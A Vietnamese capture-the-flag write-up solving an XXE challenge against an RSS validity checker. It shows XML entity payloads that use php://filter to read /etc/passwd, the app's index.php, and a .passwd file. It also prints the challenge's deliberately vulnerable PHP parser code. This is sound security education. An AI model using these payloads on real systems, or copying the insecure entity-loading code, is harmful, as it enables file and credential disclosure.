# XML External Entity - Medium

Đây là một XXE challenge, và theo như những gì tác giả cho thì file sẽ được định dạng dưới RSS.

Thêm về RSS: [XML RSS](https://www.w3schools.com/xml/xml_rss.asp)

Giờ mình sẽ tạo một file RSS đơn giản:

```
<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0">
<channel>
  <item>
    <title>hehe</title>
    <link>https://example.com</link>
    <description>hehe</description>
  </item>
</channel>
</rss>
```

Submit link đến file này, chúng ta sẽ thấy file được đọc lên:

![image](https://user-images.githubusercontent.com/83667873/148932726-1e447fdb-3402-410c-a953-259cd3a47ce0.png)

Trong challenge này ban đầu mình thử đọc file bằng một cách rất phổ biến là dùng file protocal `file:///etc/passwd` nhưng không thành công.

Nên mình thử chuyển đổi cách khác. Mình dùng:

```
php://filter/convert.base64-encode/resource=/etc/passwd
```
Tham khảo: [XXE Hacktricks](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)

```
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd" >]>
<rss version="2.0">
<channel>
  <item>
    <title>&xxe;</title>
    <link>https://example.com</link>
    <description>hehe</description>
  </item>
</channel>
</rss>
```
Kết quả thì `/etc/passwd` không nằm trong allowed path. Anyway, chúng ta có thể sử dụng cách này để đọc file:

![image](https://user-images.githubusercontent.com/83667873/148935380-60c62896-6061-4f18-8333-7d9e65cd56e1.png)

Đọc file `index.php`:

```
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php" >]>
<rss version="2.0">
<channel>
  <item>
    <title>&xxe;</title>
    <link>https://example.com</link>
    <description>hehe</description>
  </item>
</channel>
</rss>
```

![image](https://user-images.githubusercontent.com/83667873/148935637-ff8a9856-3d7e-4874-b573-2b2c489c64c4.png)

Base64 decode nội dung trên:

```
<?php

echo '<html>';
echo '<header><title>XXE</title></header>';
echo '<body>';
echo '<h3><a href="?action=checker">checker</a>&nbsp;|&nbsp;<a href="?action=auth">login</a></h3><hr />';

if ( ! isset($_GET['action']) ) $_GET['action']="checker";

if($_GET['action'] == "checker"){

   libxml_disable_entity_loader(false);
   libxml_use_internal_errors(true);

   echo '<h2>RSS Validity Checker</h2>
   <form method="post" action="index.php">
   <input type="text" name="url" placeholder="http://host.tld/rss" />
   <input type="submit" />
   </form>';


    if(isset($_POST["url"]) && !(empty($_POST["url"]))) {
        $url = $_POST["url"];
        echo "<p>URL : ".htmlentities($url)."</p>";
        try {
            $ch = curl_init("$url");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_TIMEOUT, 3);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT ,0); 
            $inject = curl_exec( $ch );
            curl_close($ch);
            $string = simplexml_load_string($inject, null, LIBXML_NOENT);
            if ( ! is_object($string) || !$string || !($string->channel) || !($string->channel->item)) throw new Exception("error"); 

            foreach($string->channel->item as $row){
                print "<br />";
                print "===================================================";
                print "<br />";
                print htmlentities($row->title);
                print "<br />";
                print "===================================================";
                print "<br />";
                print "<h4 style='color: green;'>XML document is valid</h4>";
            }
        } catch (Exception $e) {
            print "<h4 style='color: red;'>XML document is not valid</h4>";
        }

    }
}

if($_GET['action'] == "auth"){
    echo '<strong>Login</strong><br /><form METHOD="POST">
    <input type="text" name="username" />
    <br />
    <input type="password" name="password" />
    <br />
    <input type="submit" />
    </form>
    ';
    if(isset($_POST['username'], $_POST['password']) && !empty($_POST['username']) && !empty($_POST['password']))
    {
        $user=$_POST["username"];
        $pass=$_POST["password"];
        if($user === "admin" && $pass === "".file_get_contents(".passwd").""){
            print "Flag: ".file_get_contents(".passwd")."<br />";
        }

    }

}


echo '</body></html>';
```
Quan sát trong file `index.php` chúng ta thấy rằng password của admin đang nằm trong file `.passwd`. Nên công việc chúng ta cần làm là đọc file `.passwd`:

![image](https://user-images.githubusercontent.com/83667873/148936003-c6772f74-2882-40f5-80e4-5841699ad094.png)

Base64 decode giá trị trên sẽ thu được password.


